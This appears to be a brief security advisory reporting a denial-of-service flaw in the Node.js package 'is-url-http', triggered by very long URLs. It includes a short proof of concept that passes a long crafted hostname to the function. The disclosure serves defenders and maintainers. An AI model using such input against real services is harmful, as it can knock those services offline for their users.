# Overview

Check if an URL is a valid HTTP URL.

Affected versions of this package are vulnerable to Denial of Service. An attacker providing a very long url can cause a Denial of Service.

# PoC

```node
const isUrlHttp = require('is-url-http')
isUrlHttp('https://kikobeats.test.3423423423sadasd.1312321321sadsadsad.21312312321asdasdsa.21312321asdasda.21312312312adasd23423.sadasdasd231412321.34234234asdasdasdasdassdasd.34234234asdasdas')
```